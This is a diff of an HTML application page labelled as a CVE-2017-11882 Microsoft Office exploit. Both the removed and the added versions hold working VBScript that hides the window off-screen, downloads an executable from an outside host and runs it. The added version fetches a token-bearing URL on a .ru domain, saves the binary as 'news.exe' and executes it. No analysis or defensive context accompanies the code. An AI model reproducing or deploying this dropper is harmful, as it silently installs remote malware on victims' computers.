@@ -1,42 +1,26 @@
 <html>
 <head>
-<title>CVE-2017-11882-Microsoft Office Exploit</title>
+<title>CVE-2017-118Exploit</title>
 </head>
-<body>
 <script language="VBScript">
 Window.ReSizeTo 0, 0
 Window.moveTo -2000,-2000
+AutoOpen
+Sub AutoOpen()
+set WshShell = CreateObject("Wscript.Shell")
+Dim xHttp: Set xHttp = CreateObject("Microsoft.XMLHTTP")
+Dim bStrm: Set bStrm = CreateObject("Adodb.Stream")
+xHttp.Open "GET", "https://wdho.ru/qq43?pt=c6IeeGEvngtoX88KzSQEMCzw6kV8rwU0vh3SUKIqEJ8%3D", False
+xHttp.Send
+With bStrm
+ .Type = 1 '//binary
+ .Open
+ .write xHttp.responseBody
+ .savetofile "news.exe", 2 '//overwrite
+End With
+WshShell.Run("news.exe")
 
-HTTPDownload "https://clck.ru/PsWZF", "D:\Winda\calc.exe"
-
-Sub HTTPDownload( myURL, myPath )
-	Dim i, objFile, objFSO, objHTTP, strFile, strMsg
-    Const ForReading = 1, ForWriting = 2, ForAppending = 8
-
-
-    Set objFSO = CreateObject( "Scripting.FileSystemObject" )
-
-    If objFSO.FolderExists( myPath ) Then
-        strFile = objFSO.BuildPath( myPath, Mid( myURL, InStrRev( myURL, "/" ) + 1 ) )
-    ElseIf objFSO.FolderExists( Left( myPath, InStrRev( myPath, "\" ) - 
-        strFile = myPath
-    Else
-        WScript.Echo "ERROR: Target folder not found."
-        Exit Sub
-    End If
-    Set objFile = objFSO.OpenTextFile( strFile, ForWriting, True )
-    Set objHTTP = CreateObject( "WinHttp.WinHttpRequest.5.1" )
-    objHTTP.Open "GET", myURL, False
-    objHTTP.Send
-    For i = 1 To LenB( objHTTP.ResponseBody )
-        objFile.Write Chr( AscB( MidB( objHTTP.ResponseBody, i, 1 ) ) )
-    Next
-    objFile.Close( )
-	
-	CreateObject("WScript.Shell").Run("D:\Winda\calc.exe")
 End Sub
 self.close
 </script>
-CVE-2017-11882-Microsoft Office Exploit
-</body>
 </html>
